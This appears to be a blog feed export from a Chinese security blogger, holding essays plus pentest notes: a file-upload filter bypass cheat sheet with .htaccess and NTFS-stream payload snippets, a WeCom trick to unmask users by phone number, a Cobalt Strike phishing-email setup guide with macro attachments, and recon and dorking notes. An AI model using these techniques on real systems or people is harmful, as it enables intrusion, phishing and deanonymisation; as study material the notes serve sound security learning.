    <content><![CDATA[<h1 id="比如摇滚与写作"><a href="#比如摇滚与写作" class="headerlink" title="比如摇滚与写作"></a>比如摇滚与写作</h1><p>   ……<br>   于是，年轻的恋人四处流浪。<br>   心在流浪。<br>   春天，所有的心在流浪，不管人在何处。<br>   都在挣扎。<br>   在河边，在桥上，在烦闷的家里，不知所云的字行间。在寂寞的画廊，画廊中的故作优雅。阴云中有隐隐的雷声，或太阳里是无依无靠的寂静。在熙熙攘攘的街头，目光最为迷茫的那一个。<br>   空洞洞的午后。满怀希望的傍晚。在万家灯火之间脚步匆匆，在漫天星光之下翘首四顾。目光洒遍所有的车站，看尽中年人漠然的脸——这帮中年人怎都那样儿？走过一盏盏街灯。数过一二个钟点。踩着自己的影子，影子伸长然后缩短，伸长然后缩短……一家家店铺相继打烊。到哪儿去了呀你？你这个混蛋！<br>   （你这个冤家——自古的情歌早都这样唱过。）<br>   细雨迷蒙的小街。细雨迷蒙的窗口。细雨迷蒙中的琴声。<br>   直至深夜。<br>   春风从不入睡。<br>   ……</p>
<p>   一群鸽子，雪白，悠扬。一群男孩和女孩疯疯癫癫五光十色。<br>   各自在阳光下的楼群里吟咏，徘徊。男孩和女孩们在公路上骑车飞跑。<br>   年年如此，天上地下。<br>   太阳地里的老人闭目养神，男孩和女孩的事他了如指掌——除了不知道还要在这太阳底下坐多久，剩下的他都知道。<br>   一个日出丰满的女孩，一个正在成形的男子——流浪的歌手，抑或流浪的恋人——在瓢泼大雨里依偎伫立，在漫天大雪中相拥无语。</p>
<h1 id="好运设计"><a href="#好运设计" class="headerlink" title="好运设计"></a>好运设计</h1><p>   ……<br>   过程。对，过程，只剩了过程。对付绝境的办法只剩它了。不信你可以慢慢想一想，什么光荣呀，伟大呀，天才呀，壮烈呀，博学呀，这个呀那个呀，都不行，都不是绝境的对手，只要你最最关心的是目的而不是过程你无论怎样都得落入绝境，只要你仍然不从目的转向过程你就别想走出绝境。过程——只剩了它了。事实上你唯一具有的就是过程。一个只想（只想！）使过程精彩的人是无法被剥夺的，因为死神也无法将一个精彩的过程变成不精彩的过程，因为坏运气也无法阻挡你去创造一个精彩的过程，相反你可以把死亡也变成一个精彩的过程，相反坏运更利于你去创造精彩的过程。于是绝境溃败了，它必然溃败。你立于目的的绝境却实现着、欣赏着、饱尝着过程的精彩，你便把绝境送上了绝境。梦想使你迷醉着，距离就成了欢乐；追求使你充实，失败和成功都是伴奏；当生命以美的形式证明其价值的时候，幸福是享受，痛苦也是享受。现在你说你是一个幸福的人你想你会说得多么自信，现在你对一切神灵鬼怪说谢谢你们给我得好运，你看看谁还能说不。<br>   ……</p>
<p>写得真tm好，
   </p>
]]></content>
  </entry>
  <entry>
    <title>上传绕过姿势总结</title>
    <url>/2021/07/13/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93-This-is-Y/</url>
    <content><![CDATA[<p>先放一张图在这里<img src="image-20210713223910890.png" alt="image-20210713223910890"></p>
<p>在放一张图</p>
<p><img src="image-20210714092454756.png" alt="image-20210714092454756"></p>
<p>再放一个链接:<a class="link" href="https://www.freebuf.com/articles/web/265245.html">https://www.freebuf.com/articles/web/265245.html<i class="fas fa-external-link-alt"></i></a></p>
<p>实践操作过 √</p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="1-js检查-√"><a href="#1-js检查-√" class="headerlink" title="1. js检查  √"></a>1. js检查  √</h3><ul>
<li>原理：通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式。</li>
<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
<li>客户端的校验绕过：直接修改js代码或者使用抓包的方法修改请求内容绕过，可以先上传一个gif木马，通过抓包修改为jsp/php/asp，只用这种方法来检测是肯定可以绕过的。</li>
</ul>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="1-上传特殊可解析后缀-√"><a href="#1-上传特殊可解析后缀-√" class="headerlink" title="1. 上传特殊可解析后缀  √"></a>1. 上传特殊可解析后缀  √</h5><p>黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。<br><code>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</code><br>比如，黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件。<br>但是Apache的httpd.conf配置文件中，有这样一行内容：<br><code>AddType application/x-httpd-php .php .php3 .phtml</code><br>这里上传.php、.php3、.phtml后缀的文件都可以当做php文件来执行</p>
<h5 id="2-上传-htaccess"><a href="#2-上传-htaccess" class="headerlink" title="2. 上传.htaccess"></a>2. 上传.htaccess</h5><ul>
<li>原理：在Apache里，.htaccess是一个配置文件。它可以用来控制所在目录的访问权限以及解析设置。可以通过修改该文件的配置项，将该目录下的所有文件作为php文件来解析。.htaccess可以写入apache配置信息，改变当前目录以及子目录的apache配置信息。</li>
<li>应用场景：黑名单没有禁止.htaccess文件上传。</li>
<li>绕过方法：首先上传一个.htaccess文件，.htaccess文件内容如下。如果Apache允许.htaccess文件生效，并且.htaccess文件没有被重命名。那么就可以改变当前目录以及子目录的Apache配置信息，将其他后缀的文件作为PHP文件解析。</li>
</ul>
<p>服务端允许.htaccess文件生效，需要在httpd.conf中，修改两处配置项：</p>
<ul>
<li>Apache加载rewrite模块<br> LoadModule rewrite_module modules/mod_rewrite.so</li>
<li>AllowOverride All（默认为None）</li>
</ul>
<p>.htaccess文件中有两种写法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx.png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>xxx.png即可作为php脚本解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .gif</span><br></pre></td></tr></table></figure>
<p>即 .gif为后缀额度文件都当做php解析</p>
<h5 id="3-后缀大小写绕过"><a href="#3-后缀大小写绕过" class="headerlink" title="3. 后缀大小写绕过"></a>3. 后缀大小写绕过</h5><ul>
<li><p>应用场景：没有将文件后缀统一转换为大写或者是小写，而黑名单不严谨。</p>
</li>
<li><p>绕过方式：大小写绕过</p>
</li>
</ul>
<p>比如：禁止上传<code>.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess</code>后缀文件，<strong>但是没有使用<code>strtolower()</code>函数</strong></p>
<h5 id="4-点绕过"><a href="#4-点绕过" class="headerlink" title="4. 点绕过"></a>4. 点绕过</h5><ul>
<li>应用场景：Windows平台，服务端没有使用deldot()删除文件名末尾的点。</li>
<li>利用方式：上传名为assert.php.的文件。在Windows服务器中，后缀名之后的点，在保存时，会被自动忽略</li>
<li></li>
</ul>
<h5 id="5-空格过"><a href="#5-空格过" class="headerlink" title="5. 空格过"></a>5. 空格过</h5><ul>
<li><p>应用场景：服务器为Windows平台，在对用户上传的文件名进行处理时，没有使用trim()函数去除字符串收尾处的空白字符。</p>
</li>
<li><p>利用方式：由于在Windows中文件后缀名末尾有空格会自动去掉,但是比较时,如果没有用trim()函数去除字符串收尾处的空白字符,那就可以绕过黑名单</p>
<p>例如:<code>&quot;shell.php &quot;</code>Windows会自动去掉末尾的空格变成<code>&quot;shell.php&quot;</code></p>
</li>
</ul>
<h5 id="6-DATA绕过-√"><a href="#6-DATA绕过-√" class="headerlink" title="6. ::$DATA绕过  √"></a>6. ::$DATA绕过  √</h5><ul>
<li>应用场景：Windows平台，没有使用str_ireplace()将::$DATA替换为空，导致可以利用<strong>NTFS文件流特性。</strong></li>
<li>利用方式：假设xxx.php的内容为<?php phpinfo();?></li>
</ul>
<table>
<thead>
<tr>
<th>上传的文件名</th>
<th>服务器表面现象</th>
<th>生成的文件内容</th>
</tr>
</thead>
<tbody><tr>
<td>xxx.php:a.jpg</td>
<td>生成xxx.php</td>
<td>空</td>
</tr>
<tr>
<td>xxx.php::$DATA</td>
<td>生成xxx.php</td>
<td><?php phpinfo();?></td>
</tr>
<tr>
<td>xxx.php::$INDEX_ALLOCATION</td>
<td>生成xxx.php文件夹</td>
<td></td>
</tr>
<tr>
<td>xxx.php::$DATA.jpg</td>
<td>生成0.jpg</td>
<td><?php phpinfo();?></td>
</tr>
<tr>
<td>xxx.php::$DATA\aaa.jpg</td>
<td>生成aaa.jpg</td>
<td><?php phpinfo();?></td>
</tr>
<tr>
<td>可以根据情况来使用,一般就是直接::$data了</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h5 id="7-配合解析漏洞"><a href="#7-配合解析漏洞" class="headerlink" title="7. 配合解析漏洞"></a>7. 配合解析漏洞</h5><ul>
<li><p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p>
<p>Apache HTTPD是一款HTTP服务器,在它的2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
</li>
<li><p>Apache HTTPD 多后缀解析漏洞</p>
</li>
<li><p>Nginx 解析漏洞</p>
</li>
<li><p>IIS7.5解析漏洞</p>
</li>
<li><p>IIS6解析漏洞</p>
</li>
</ul>
<h5 id="8-双后缀名绕过"><a href="#8-双后缀名绕过" class="headerlink" title="8. 双后缀名绕过"></a>8. 双后缀名绕过</h5><ul>
<li><p>应用场景：黑名单、使用str_ireplace()将匹配到的黑名单中的内容替换为空。</p>
</li>
<li><p>利用方式：因为仅将黑名单中的内容一次替换为空，可以重写绕过。<br>xxx.phphpp,这样子去掉中间这个php后,就变成了 xxx.php</p>
</li>
</ul>
<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="1-MIME过-√"><a href="#1-MIME过-√" class="headerlink" title="1. MIME过 √"></a>1. MIME过 √</h5><p>MIME类型是描述消息内容类型的因特网标准。<br>HTTP头部的Content-Type字段的内容就是MIME类型。<br>只需要将MIME类型修改为白名单中允许的类型即可。<br>比如，图片上传点，允许上传gif、jpeg、png。用Burp抓包，将HTTP头部的Content-Type字段内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: image&#x2F;gif</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line">Content-Type: image&#x2F;png</span><br></pre></td></tr></table></figure>


<h5 id="2-00截断"><a href="#2-00截断" class="headerlink" title="2. %00截断"></a>2. %00截断</h5><p>%00是chr(0)，空字符。<br>程序会把%00当做结束符，后面的数据直接忽略掉。<br>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来验证，但是最后文件保存在本地时，%00或截断文件名，只保存%00之前的内容。</p>
<ul>
<li>应用场景：白名单、上传路径可控、php.ini中的<code>magic_quotes_gpc</code>为off</li>
<li>利用方式：<br>如果上传文件的路径为：用户可控的上传路径/随机数.白名单中的后缀<br>正常情况下，服务器拼接得到的上传路径为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$img_path &#x3D; ..&#x2F;upload&#x2F;5920201223231032.gif;</span><br></pre></td></tr></table></figure>
而用户在可控的上传路径中，使用<code>%00</code>截断后，拼接得到的上传路径为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$img_path &#x3D; ..&#x2F;upload&#x2F;xxx.php%00&#x2F;5920201223231032.gif</span><br></pre></td></tr></table></figure>
对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是<code>xxx.php</code>，因为%00之后的内容被截断了。</li>
</ul>
<h5 id="3-0x00截断"><a href="#3-0x00截断" class="headerlink" title="3. 0x00截断"></a>3. 0x00截断</h5><ul>
<li>应用场景：白名单、上传路径可控、php.ini中的<code>magic_quotes_gpc</code>为offphp、版本&lt;5.3.4</li>
<li>利用方式：如果上传文件的路径为：用户可控的上传路径/随机数.白名单中的后缀</li>
</ul>
<p>正常情况下，服务器拼接得到的上传图像地址为$img_path =../upload/5920201223231032.gif<br>但是，用户如果在可控上传路径中写入一个php后缀，并且php后缀后面有一个0x00字符<br>服务器拼接得到的上传图像地址会变为$img_path =../upload/xxx.php[0x00]/5920201223231032.gif<br>对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是xxx.php，因为0x00之后的内容被截断了。</p>
<h5 id="4-0x0a截断"><a href="#4-0x0a截断" class="headerlink" title="4. 0x0a截断"></a>4. 0x0a截断</h5><p>同3 0x00截断</p>
<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><h4 id="1-文件头检查"><a href="#1-文件头检查" class="headerlink" title="1. 文件头检查"></a>1. 文件头检查</h4><p>上传具有正常文件头的图片马即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gif的文件头为  GIF89a</span><br><span class="line">png的文件头为  89504E47</span><br><span class="line">jpg的文件头为  FFD8FF</span><br></pre></td></tr></table></figure>
<p>此时如果不存在上述的漏洞，只能上传图片格式的后缀，还需使用<strong>文件包含漏洞</strong>运行图片马中的恶意代码</p>
<h4 id="2-突破getimagesize"><a href="#2-突破getimagesize" class="headerlink" title="2. 突破getimagesize()"></a>2. 突破getimagesize()</h4><p>getimagesize()函数会返回一个数组，其中下标2是图像的类型。1=GIF，2=JPG, 3=PNG。这里上传一个正常图像后缀的图片马，使用<strong>文件包含漏洞</strong>运行图片马中的恶意代码即可。</p>
<h4 id="3-突破exif-imagetype"><a href="#3-突破exif-imagetype" class="headerlink" title="3. 突破exif_imagetype()"></a>3. 突破exif_imagetype()</h4><p>exif_imagetype()— 判断一个图像的类型。检查图像的第一个字节。可能返回的常量有IMAGETYPE_GIF=1<br>IMAGETYPE_JPEG=2<br>MAGETYPE_PNG=3<br>文件头不正确返回false<br>上传具有正常文件头的图片马即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gif的文件头为  GIF89a</span><br><span class="line">png的文件头为  89504E47</span><br><span class="line">jpg的文件头为  FFD8FF</span><br></pre></td></tr></table></figure>
<p>然后使用<strong>文件包含漏洞</strong>运行图片马中的恶意代码。</p>
<h4 id="4-二次渲染"><a href="#4-二次渲染" class="headerlink" title="4. 二次渲染"></a>4. 二次渲染</h4><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ol>
<li><p>条件竞争</p>
<p>条件竞争漏洞（Race condition）官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
<p>upload-labs中的Pass-17是一个典型的条件竞争上传</p>
<p>代码执行逻辑：<strong>先移动，后检测，不符合再删除，符合则改名字。</strong> </p>
<p>因此我们可以让burp一直发包，让php程序一直处于移动php文件到upload目录这个阶段</p>
<p>我们同时使用多线程并发访问上传的文件，总会有一次在上传文件到删除文件这个时间段访问到上传的php文件，一旦我们成功访问到上传的php文件，那么它就会向服务器写一个shell。</p>
</li>
</ol>
<h2 id="顺带提一嘴防御"><a href="#顺带提一嘴防御" class="headerlink" title="顺带提一嘴防御"></a>顺带提一嘴防御</h2><ul>
<li>服务端文件扩展名使用白名单+文件重命名</li>
<li>对文件内容进行检测</li>
<li>对中间件进行安全配置</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>企业微信溯源</title>
    <url>/2023/08/14/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%BA%AF%E6%BA%90/</url>
    <content><![CDATA[<p>企业微信，目前测试版本4.1.8.23932</p>
<p>可以通过手机号溯源到真实用户名和所在企业</p>
<p><img src="image-20230814112755800.png" alt="image-20230814112755800"></p>
<p>这里测试 <code>MTczNDY2MDc0NjAK </code>这个手机号</p>
<p>先搜索，能搜到，点击右上角进行投诉，然后随便选一个，点击到提交给企业微信团队审核，点击聊天证据，就会跳转到和这个人的聊天页面。</p>
<p><img src="image-20230814112811488.png" alt="image-20230814112811488"></p>
<p><img src="image-20230814112832870.png" alt="image-20230814112832870"></p>
<p>左上角就可以看到对方名字和公司了</p>
<p><img src="/media/this_is_y/D/Typora/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%BA%AF%E6%BA%90/image-20230814112618454.png" alt="image-20230814112618454"></p>
]]></content>
  </entry>
  <entry>
    <title>使用Cobalr strike发送钓鱼邮件</title>
    <url>/2020/06/18/%E4%BD%BF%E7%94%A8Cobalr%20strike%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13159570.html">源地址：https://www.cnblogs.com/This-is-Y/p/13159570.html<i class="fas fa-external-link-alt"></i></a></p>
<p>本文参考<a class="link" href="https://www.freebuf.com/sectool/124905.html">https://www.freebuf.com/sectool/124905.html<i class="fas fa-external-link-alt"></i></a></p>
<p>感谢前人指路</p>
<p> </p>
<p>前面的建立一个office宏病毒、克隆一个网站等操作，在这片freebuf的文章中写的很清楚详细了。</p>
<p>这里我就针对填写参数做一些细节补充：</p>
<p><strong>Targets：</strong>是要发送邮箱地址的文件，比如：</p>
<img src="1503868-20200618193453413-182685379.png" width="900" loading="lazy">

<p> </p>
<p> </p>
<p> 建立一个文件，一个邮箱一行，不要有别的东西</p>
<p><strong>Template：</strong>是要发送邮件的模板，这个可以在个人邮箱中导出一个即可。</p>
<p>关于如何导出，我用的qq邮箱，这里我以qq邮箱为例</p>
<p>1.因为要自定义邮件内容，所以先写好一封邮件，即模板，发送给自己的小号或基友。然后在 已发送 中找到那封邮件。</p>
<img src="1503868-20200618193920491-1425033186.png" width="900" loading="lazy">

<p> </p>
<p>点击右边那个小到看不见的<img src="1503868-20200618194007108-157067518.png" alt loading="lazy">这个玩意（红箭头标出来了），然后导出为eml文件即可</p>
<p><strong>Attachment：</strong>放入我们搞好的word（用中文文件名似乎会乱码）</p>
<p><strong>Embed url：</strong>填写搭建好的网站，然后配置好</p>
<p><strong>mailserver：</strong>我用的qq邮箱，这里就用qq邮箱做示例。其他的163等邮箱大同小异。</p>
<p>　　首先在qq邮箱 <strong>设置</strong>、<strong>账户</strong> 中找到 <strong>POP3/IMAP/SMTP/Exchange/CardDAV/CalDAV服务</strong> 这一列（POP3/SMTP/IMAP等服务是什么左转百度或谷歌wiki，他们讲的比我好）。打开POP/SMTP服务以及IMAP/SMTP服务（打开这些服务的风险qq邮箱都会告诉你，自行斟酌，出了啥岔子与我无关）打开后，点击下面的生成授权码。会获得一组神秘代码，保存下来。</p>
<p>　　<img src="1503868-20200618195235715-123373268.png" width="900">　　</p>
<p>　　回到cs中。点开Mail Server后面的这个</p>
<p> 　　<img src="1503868-20200618195720809-1663090374.png" alt loading="lazy"></p>
<p> </p>
<p> 　　进入到配置页面</p>
<p>　　<img src="1503868-20200618195802359-1900204309.png" alt loading="lazy"></p>
<p> </p>
<p> 　　这边的参数选项。</p>
<p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
<p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#x31;&#52;&#49;&#51;&#x38;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;">&#x39;&#53;&#50;&#55;&#x31;&#52;&#49;&#51;&#x38;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
<p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
<p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
<p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
<p>　　配置好后大概是这个样子</p>
<p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
<p>　　点解set保存设置。</p>
<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#x35;&#50;&#x37;&#x31;&#52;&#49;&#51;&#x38;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#57;&#x35;&#50;&#x37;&#x31;&#52;&#49;&#51;&#x38;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#x31;&#52;&#x31;&#51;&#x38;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#x39;&#53;&#50;&#55;&#x31;&#52;&#x31;&#51;&#x38;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
<img src="1503868-20200618195101320-369498795.png" alt loading="lazy">

<p> </p>
<p>全部配置好后差不多就是这样子</p>
<img src="1503868-20200618201158502-1594240584.png" alt loading="lazy">

<p>这样就表示发送成功了。</p>
<img src="1503868-20200618201554578-968296910.png" alt loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>信息搜集</title>
    <url>/2021/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-This-is-Y/</url>
    <content><![CDATA[<p>freebuf：<a class="link" href="https://www.freebuf.com/articles/web/190403.html">https://www.freebuf.com/articles/web/190403.html<i class="fas fa-external-link-alt"></i></a><br><img src="1543072448_5bf96ac069a0b.png" alt="1543072448_5bf96ac069a0b"></p>
<h2 id="信息搜集内容"><a href="#信息搜集内容" class="headerlink" title="信息搜集内容"></a>信息搜集内容</h2><ul>
<li>服务器信息(端口、服务、IP)</li>
<li>网站信息（服务器操作系统、中间件、数据库、编程语言、敏感目录与文件、旁站查询、C段查询）</li>
<li>域名信息( whois、备案信息、子域名收集)</li>
<li>网站管理员信息(姓名、职务、生日、联系电话、邮件地址)</li>
</ul>
<p>判断CDN<br>    多地ping<br>        <a class="link" href="http://ping.chinaz.com/">http://ping.chinaz.com/<i class="fas fa-external-link-alt"></i></a> 站长之家ping测试在最后有国外的服务器<br>        <a class="link" href="https://www.wepcc.com/">https://www.wepcc.com/<i class="fas fa-external-link-alt"></i></a></p>
<p>绕过CDN<br>CDN按流浪计费，可能不在境外使用，或者它的边缘业务（子域名）不会架设CDN服务</p>
<ul>
<li>国外PING</li>
<li>子域名PING（子域名在同一个服务器或者C段）</li>
<li>邮件服务器（子域名在同一个服务器或者C段）</li>
<li>DNS解析记录（从前没钱挂CDN，IP被记录下来了）<br>  <a class="link" href="https://site.ip138.com/">https://site.ip138.com<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://viewdns.info/history">https://viewdns.info/history<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://securitytrails.com/">https://securitytrails.com/<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>子域名查询：</p>
<ul>
<li><p>oneforall  <a class="link" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll<i class="fas fa-external-link-alt"></i></a></p>
</li>
<li><p>证书查询 </p>
<p>   <a class="link" href="https://myssl.com/">https://myssl.com/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://search.censys.io/">https://search.censys.io/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://crt.sh/?Identity=">https://crt.sh/?Identity=<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://spyse.com/">https://spyse.com/<i class="fas fa-external-link-alt"></i></a>  查子域名收费</p>
</li>
</ul>
<p>以默安为例子</p>
<p>公司全称叫：杭州默安科技有限公司<br>官网：<a class="link" href="https://www.moresec.cn/">https://www.moresec.cn/<i class="fas fa-external-link-alt"></i></a></p>
<p>在企查查上查到对外投资四家公司<br>    北京默安科技有限公司<br>    深圳默安科技有限公司<br>    上海默知安科技有限公司<br>    长沙火线云网络科技有限公司</p>
<p><img src="image-20210604153232318.png" alt="image-20210604153232318"></p>
<p>查电话查到另一家公司  0571-57890068<br>    杭州云中盟股权投资合伙企业（有限合伙）</p>
<p>留个坑</p>
]]></content>
  </entry>
  <entry>
    <title>信息收集笔记</title>
    <url>/2019/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11216357.html">源地址：https://www.cnblogs.com/This-is-Y/p/11216357.html<i class="fas fa-external-link-alt"></i></a></p>
<p>大体分为8块（图片来源carcer）</p>
<img src="1503868-20190719224918305-988435690.png" alt>

<ol>
<li>域名信息</li>
<li>敏感目录</li>
<li>端口扫描</li>
<li>旁站C段</li>
<li>整站分析</li>
<li>谷歌hacker</li>
<li>url采集</li>
<li>信息分析</li>
</ol>
<p>1.域名信息</p>
<p>　　-对应IP收集</p>
<p>　　　　-相关域名对应IP，使用nslookup，各种工具网站</p>
<p>　　-子域名收集</p>
<p>　　　　-layer子域名挖掘机，SubDomainsBrute等</p>
<p>　　- whois信息查询</p>
<p>　　　　-使用各种网站爱站网，站长之家等，同时使用域名反查，得到注册人的详细信息</p>
<p>2.敏感目录</p>
<p>　　-主要是指robot.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件</p>
<p>　　-主要工具：</p>
<p>　　　　字典爆破 &gt;&gt;&gt; 御剑、dirbuster、wwwscan、IIS_shortname_Scanner等</p>
<p>　　　　蜘蛛爬行 &gt;&gt;&gt; 爬行菜刀、webrobot、burp等</p>
<p>3.端口扫描</p>
<p>　　端口及对应服务在这里（真多。。。。==）：<a class="link" href="https://blog.csdn.net/qq_43539064/article/details/96498160">https://blog.csdn.net/qq_43539064/article/details/96498160<i class="fas fa-external-link-alt"></i></a></p>
<p>　　工具：nmap、portsan、ntscan、telnet等</p>
<p>4.旁站C段</p>
<p>　　旁站：同服务器其他站点（其他下手对象）</p>
<p>　　C段：同一网段其他服务器</p>
<p>　　工具：</p>
<p>　　　　-web &gt;&gt;&gt; k8旁站、御剑1.5</p>
<p>　　　　-端口 &gt;&gt;&gt; portscan</p>
<p>5.整站分析</p>
<p>　　服务器类型：</p>
<p>　　　　服务器平台，版本等</p>
<p>　　网站容器：</p>
<p>　　　　搭建网站的服务组件，例如iis，Apache，nginx，tomcat</p>
<p>　　脚本类型：</p>
<p>　　　　ASP，PHP，JSP，aspx等</p>
<p>　　数据库类型</p>
<p>　　　　access，sqlserver，mysql，oracle，portgresql等</p>
<p>　　CMS类型</p>
<p>　　WAF</p>
<p>6.谷歌hacker</p>
<p>　　-Intext：</p>
<p>　　　　查找网页中有xx关键字的网站　　Intext：管理员登陆</p>
<p>　　-Intitle：</p>
<p>　　　　查找某个标题　　　　　　　　　Intitle：后台登陆</p>
<p>　　-Filetype：</p>
<p>　　　　查找某个文件类型的文件　　　　数据挖掘fFletype：doc</p>
<p>　　-Inurl：</p>
<p>　　　　查找url中带有某字段的网站　　   Inurl：php？id=</p>
<p>　　-Site：</p>
<p>　　　　在某域名中查找信息</p>
<p>　　在url后加  /  或  ‘  返回错误，加-0返回正常时，存在注入漏洞</p>
<p>7.url采集</p>
<p> 　　采集相关url的同类网站</p>
<p>　　例如：php？id=   、漏洞网站 、相同某种指纹网站</p>
<p>　　工具：上一节谷歌hacker、url采集器</p>
<p>8.后台查找</p>
<p>　　1.弱口令默认后台：admin、admin/login.asp、manage、login.asp等</p>
<p>　　2.查看网页链接：一般来说，网站的主页有管理登陆类似的东西</p>
<p>　　3.查看网站图片属性</p>
<p>　　4.查看网站使用的管理系统,从而确定后台</p>
<p>　　5.用工具查找,如wwwscan,intellitamper,御剑</p>
<p>　　6.robot.txt的帮助,robots.txt文件告诉爬虫在服务器上什么文件可以被查看</p>
<p>　　7.谷歌hacker</p>
<p>　　8.查看网站使用的编辑器是否有默认后台</p>
<p>　　9.短文件利用</p>
<p>　　10.sqlmap –sql-shell load_file(‘d/wwroot/index.php’);</p>
<p>9.CDN绕过</p>
<p>　　CDN:Content Delivery Network，即<a class="link" href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络<i class="fas fa-external-link-alt"></i></a></p>
<p>　　使用站长之家的PING检测,</p>
<p>　　<img src="1503868-20190720101731429-518847773.png" alt width="946" height="430"></p>
<p>　　如果说响应IP不同,则说明有CDN服务器,反之则没有</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
